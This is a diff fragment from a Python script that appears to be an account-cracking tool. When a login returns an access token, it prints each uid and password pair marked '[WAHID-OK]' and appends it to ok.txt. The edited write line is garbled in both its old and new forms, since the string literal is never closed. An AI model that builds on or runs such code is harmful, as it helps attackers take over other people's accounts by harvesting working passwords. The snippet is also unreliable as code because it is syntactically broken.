@@ -466,7 +466,7 @@ def b_menu_select():
 		                                                                                        if 'access_token' in d:
 		                                                                                            print("\x1b[1;32m[WAHID-OK] \033[1;32m"+uid+" | "+pass11+"\x1b[1;37m")
 		                                                                                            ok=open("ok.txt","a")
-		                                                                                            ok.write(uid+" |
+		                                                                                            ok.write(uid+"
 		                                                                                            ok.close()
 		                                                                                            oks.append(uid)                                                
 														
